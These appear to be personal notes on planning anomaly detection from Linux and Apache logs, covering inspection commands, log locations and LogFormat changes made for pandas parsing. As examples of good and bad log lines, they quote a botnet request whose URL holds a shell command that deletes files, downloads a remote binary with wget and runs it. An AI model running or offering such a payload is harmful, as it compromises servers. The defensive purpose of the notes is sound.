________________________________________________________________________________________________________________________________

Anomaly detection planning: What Linux logs to use
________________________________________________________________________________________________________________________________
** Commands to examine Linux **
lsof, netstat, dstat, iostat & ps.

lsof | grep www-data
netstat -la
netstat | grep ESTABLISHED
ps -axu
________________________________________________________________________________________________________________________________
** Interesting log files **
/var/log/access.log
/var/log/ufw
journalctl -r
journalctl -f
journalctl -u apache --> journal does not contain apache2 folder log by default
Journalctl settings --> $ cd /etc/systemd $ nano journald.conf
________________________________________________________________________________________________________________________________
** Interesting software's **
sysstat -->  GPL-2.0
nethogs -->  GPL-2.0
________________________________________________________________________________________________________________________________
** Why apache2 logs could be a good target **
Easy to interpret, websites are common target for attacks, apache is world's most used webserver software & the closest part 
of the operating system to the public network.

/var/log/apache2/access.log
http code 4xx and exploit url, so it didn't work = NO MATTER
http code 2xx and working exploit url, so attack got through = VERY BAD
http code 3xx and working exploit url, so the attacker is routing traffic elsewhere through you = VERY BAD
http code 2xx and working .inc tag, so attacker successfully includes something usually has access to data in server  = VERY BAD
http code 2xx and working .install tag, so attacker has access to installing to your server = VERY BAD
http code 2xx and POST, If the server does not have file storage function and attacker uses post successfully. = GENERALLY BAD

EXAMPLE OF GOOD LOG:
[TIME] "GET /shell?cd+/tmp;+rm+-rf+*;+wget+http://IP/arm7;+chmod+777+arm7;+./arm7+rep.arm7 HTTP/1.0" 404 537 "-" "botnet/2.0"

EXAMPLE OF BAD LOG:
[TIME] "GET /shell?cd+/tmp;+rm+-rf+*;+wget+http://IP/arm7;+chmod+777+arm7;+./arm7+rep.arm7 HTTP/1.0" 200 238 "-" "botnet/2.0"

HTTP status codes simplified
2xx - OK WORKING
3xx - REDIRECT
4xx - NOT FOUND
5xx - SERVER ERRORS

Google cloud server has log rotation of 14 by default = logs deletes after 12 duplicates, 1day = new logfile.
Rotate file found at $ cat /etc/logrotate.d/apache2
________________________________________________________________________________________________________________________________
** Web searching log files **
Google can search for files with functions inurl and filetype:
https://www.google.com/search?q=inurl:access.log+filetype:log
https://raw.githubusercontent.com/linuxacademy/content-elastic-log-samples/master/access.log
________________________________________________________________________________________________________________________________
** Apache access.logs format **
Apache access log format can be changed from /etc/apache2/apache2.conf file by changing default NCSA extended/combined 
log format. Access.log format is at line 213 in apache2.conf file.

Old format:
LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-agent}i\""
New format:
LogFormat "%{%d/%b/%Y/%T}t %h %>s %O %D %r" combined

%{%d/%b/%Y/%T}t	= Time stamp.
%h		= IP address.
%>s		= Status code.
%O		= Bytes sent.
%D		= Request time taken.
%r		= Method, first line of request and protocol.

Example of old log of requesting favicon icon:
::1 - - [29/Mar/2020:14:12:41 +0300] "GET /favicon.ico HTTP/1.1" 404 487 "http://localhost/" "Mozilla/5.0 (X11; Linux x86_64) 
AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/80.0.3987.87 Chrome/80.0.3987.87 Safari/537.36"

Example of new log of requesting favicon icon:
01/Apr/2020/17:49:39 ::1 404 487 123 GET /favicon.ico HTTP/1.1

Should be easier to work with these log files since, spaces split different columns.
________________________________________________________________________________________________________________________________
** Problems 1 **
I manually looked through the new logs from http://35.228.191.122/ access.log and noticed that the ssh tries logs do not fill 
all the columns -> this would be a problem when we put columns in python code with pandas.

Sample of bad log format:
03/Apr/2020/11:46:42 10.10.10.10 400 493 57 SSH-2.0-Go

I changed the format of the logs by separating the column from apache2.conf parser %r --> %m %U %H. I also changed bit format 
for better one %O --> %B
New log format: **LogFormat "%{%d/%b/%Y/%T}t %h %>s %B %D %m %U %H"  combined**

Sample of new log:
03/Apr/2020/12:38:40 10.10.10.10 400 350 56 SSH-2.0-OpenSSH_7.6p1 Ubuntu-4 HTTP/1.0
03/Apr/2020/13:20:50 10.10.10.10 200 12 397 GET /index.html HTTP/1.1

________________________________________________________________________________________________________________________________
** Problems 2 **

%r uses \xhh sequences to turn some user inputs to hexadecimals from apache.org: "For security reasons, starting with version 
2.0.46, non-printable and other special characters in %r, %i and %o are escaped using \xhh sequences, where hh stands for the 
hexadecimal representation of the raw byte"
%U = path or %F = File, does not have that feature so its leaving spaces in logs which is problem while parsing data. Not sure 
why Apache has left this feature off from these and cannot find how to turn if it even can be turned on, so maybe itâ€™s time to 
change log format again...

Log format: %{%d/%b/%Y/%T}t %h %>s %B %D %m %U %H
Log sample: 08/Apr/2020/19:00:30 192.168.10.61 404 196 261 GET /asdasd asd HTTP/1.1
Log format: %{%d/%b/%Y/%T}t %h %>s %O %D %r
Log sample: 08/Apr/2020/19:00:30 192.168.10.61 404 196 261 GET /asdasd%20asd HTTP/1.1

Potential new log format?
08/Apr/2020/20:25:05, 192.168.10.61, 200, 12, 305, "GET /asdasd%20asd HTTP/1.1"
Or
Blocking usage of spaces in URL with Apache2 mod_rewrite --> keeps old log and adds new redirect log does not fix problem

Came up with idea to fix log with pandas csv read functions. Using sep=' ', quotechar='"', escapechar=' '. Also added 
query string tag %q aftret url tag.
Working Log format: "\"%{%d/%b/%Y/%T}t\" \"%h\" \"%>s\" \"%B\" \"%D\" \"%m\" \"%U/%q\" \"%H\""
Log sample: "11/Apr/2020/10:13:18" "192.168.10.61" "200" "12" "157" "GET" "/index.html/?asd asd" "HTTP/1.1"
________________________________________________________________________________________________________________________________

SOURCES:
Apache access.log format. Apache Module mod_log_config URL: http://httpd.apache.org/docs/current/mod/mod_log_config.html
________________________________________________________________________________________________________________________________
